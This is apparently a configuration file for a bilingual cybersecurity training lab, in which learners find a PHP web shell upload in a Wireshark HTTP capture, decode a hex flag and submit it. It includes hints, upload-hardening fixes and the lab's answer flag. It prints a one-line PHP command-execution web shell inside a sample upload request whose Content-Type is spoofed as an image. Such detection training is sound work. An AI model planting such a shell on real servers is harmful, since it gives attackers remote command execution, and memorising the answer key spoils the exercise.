import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab8Metadata: LabMetadata = {
  slug: 'wireshark-webshell-upload',
  title: 'Wireshark: Web Shell Upload Detection',
  ar_title: 'Wireshark: اكتشاف رفع Web Shell',
  description:
    'A compromised web server triggered an IDS alert. Investigate the HTTP capture, find the malicious PHP web shell upload POST request, decode the hex-encoded flag from the shell content, then submit.',
  ar_description:
    'أطلق خادم ويب مخترق تنبيه IDS. افحص التقاط HTTP، ابحث عن طلب POST الخبيث لرفع PHP web shell، فكّ تشفير الـ flag المرمّز بـ hex من محتوى الـ shell، ثم أرسله.',
  difficulty: 'ADVANCED',
  category: 'NETWORK_SECURITY',
  executionMode: 'SHARED_BACKEND',
  skills: [
    'Wireshark',
    'HTTP POST Analysis',
    'File Upload Exploitation',
    'Hex Decoding',
    'Web Shell Detection',
    'Multipart Form Data',
  ],
  xpReward: 225,
  pointsReward: 450,
  duration: 40,
  isPublished: true,
  goal: 'Find the malicious PHP web shell upload in HTTP traffic, decode the hex-encoded flag embedded in the shell payload, and submit.',
  ar_goal: 'ابحث عن رفع PHP web shell الخبيث في حركة HTTP، فكّ تشفير الـ flag المضمّن بـ hex في الـ payload، وأرسله.',
  briefing: {
    en: 'Your IDS fired on a web server upload endpoint. A packet capture was taken from the web server NIC. The attacker uploaded a PHP web shell disguised as an image. Find it, extract the hex-encoded flag from the shell source, decode it, and submit.',
    ar: 'أطلق نظام IDS تنبيهاً على نقطة نهاية رفع خادم الويب. تم التقاط الحزم من بطاقة شبكة خادم الويب. رفع المهاجم PHP web shell متنكّراً كصورة. ابحث عنه، استخرج الـ flag المرمّز بـ hex من مصدر الـ shell، فكّ تشفيره، وأرسله.',
  },
  stepsOverview: {
    en: [
      'Load the capture and observe the traffic — note the mix of normal and suspicious requests',
      'Filter HTTP POST requests: http.request.method == "POST"',
      'Locate the POST to /upload with a .php filename (Content-Type spoofed as image/jpeg)',
      'Expand the multipart body to see the PHP shell source code',
      'Find the hex-encoded string in the PHP shell content (inside a comment)',
      'Use the Hex Decoder tool to convert the hex to ASCII',
      'Submit the decoded flag',
    ],
    ar: [
      'حمّل التقاط الحزم ولاحظ الحركة — لاحظ مزيج الطلبات العادية والمشبوهة',
      'صفّ طلبات HTTP POST: http.request.method == "POST"',
      'حدد الـ POST إلى /upload بـ filename ينتهي بـ .php (Content-Type مزيّف كـ image/jpeg)',
      'وسّع جسم الـ multipart لرؤية كود PHP shell المصدري',
      'ابحث عن السلسلة المرمّزة بـ hex في محتوى PHP shell (داخل تعليق)',
      'استخدم أداة Hex Decoder لتحويل الـ hex إلى ASCII',
      'أرسل الـ flag المفكوك',
    ],
  },
  solution: {
    context:
      'The attacker exploited an unrestricted file upload vulnerability. They uploaded a PHP reverse shell with a spoofed Content-Type of image/jpeg while the filename ended in .php. The flag was hex-encoded inside a PHP comment within the shell.',
    vulnerableCode:
      'POST /upload HTTP/1.1\nContent-Type: multipart/form-data; boundary=----Boundary\n\n------Boundary\nContent-Disposition: form-data; name="file"; filename="shell.php"\nContent-Type: image/jpeg\n\n<?php system($_GET["cmd"]); /* FLAG: 464c41477b...} */ ?>',
    exploitation:
      'Filter POST → find /upload with .php filename → expand body → locate hex in PHP comment → decode hex → submit flag.',
    steps: {
      en: [
        'Apply filter: http.request.method == "POST"',
        'Find packet with URI /upload and .php filename',
        'Expand httpData → body → read multipart content',
        'Locate hex string inside PHP comment /* FLAG: <hex> */',
        'Paste hex into the decoder → get ASCII flag',
      ],
      ar: [
        'طبّق الفلتر: http.request.method == "POST"',
        'ابحث عن حزمة بـ URI /upload وـ filename ينتهي بـ .php',
        'وسّع httpData → body → اقرأ محتوى الـ multipart',
        'حدد سلسلة hex داخل تعليق PHP /* FLAG: <hex> */',
        'الصق الـ hex في الـ decoder → احصل على الـ flag بـ ASCII',
      ],
    },
    fix: [
      'Validate file extension server-side — reject .php, .phtml, .phar, etc.',
      'Never trust the Content-Type header sent by the client.',
      'Store uploaded files outside the web root.',
      'Use a Content Security Policy and disable PHP execution in upload directories.',
      'Scan uploads with antivirus / YARA rules before storage.',
    ],
  },
  postSolve: {
    explanation: {
      en: 'Unrestricted file upload is an OWASP Top 10 vulnerability. Attackers exploit it to plant web shells that give them RCE on the server. Detection in network traffic is straightforward once you know what to look for.',
      ar: 'رفع الملفات غير المقيّد ثغرة من OWASP Top 10. يستغلها المهاجمون لزرع web shells تمنحهم تنفيذ أوامر عن بُعد على الخادم. الاكتشاف في حركة الشبكة سهل بمجرد معرفة ما تبحث عنه.',
    },
    impact: {
      en: 'A successful web shell upload gives the attacker full RCE on the server, enabling data exfiltration, lateral movement, persistence, and ransomware deployment.',
      ar: 'يمنح رفع web shell الناجح المهاجمَ تنفيذاً كاملاً للأوامر على الخادم، مما يُمكّنه من تسريب البيانات، والتحرك جانبياً، والاستمرارية، ونشر برامج الفدية.',
    },
    fix: [
      'Whitelist allowed file types — do not use a blacklist.',
      'Serve uploaded content from a separate domain without PHP execution.',
      'Monitor upload directories for new .php files with file integrity monitoring.',
    ],
  },
  hints: [
    {
      order: 1,
      content: 'Filter: http.request.method == "POST" — find the suspicious POST with a .php filename disguised as an image.',
      ar_content: 'فلتر: http.request.method == "POST" — ابحث عن الـ POST المشبوه بـ filename ينتهي بـ .php متنكّراً كصورة.',
      xpCost: 10,
    },
    {
      order: 2,
      content: 'The attacker spoofed Content-Type as image/jpeg but the filename ends in .php. Expand the packet body to see the multipart form data and the PHP code.',
      ar_content: 'زيّف المهاجم Content-Type كـ image/jpeg لكن الاسم ينتهي بـ .php. وسّع جسم الحزمة لرؤية بيانات multipart وكود PHP.',
      xpCost: 20,
    },
    {
      order: 3,
      content: 'Find the HIDDEN comment inside the PHP shell code. The value after the comment marker is hex-encoded. Paste it into the Hex Decoder tool below the capture.',
      ar_content: 'ابحث عن التعليق المخفي داخل كود PHP shell. القيمة بعد علامة التعليق مرمّزة بـ hex. الصقها في أداة Hex Decoder أسفل التقاط الحزم.',
      xpCost: 30,
    },
  ],
  flagAnswer: 'FLAG{WEBSHELL_UPLOAD_DETECTED}',
  initialState: {},
};
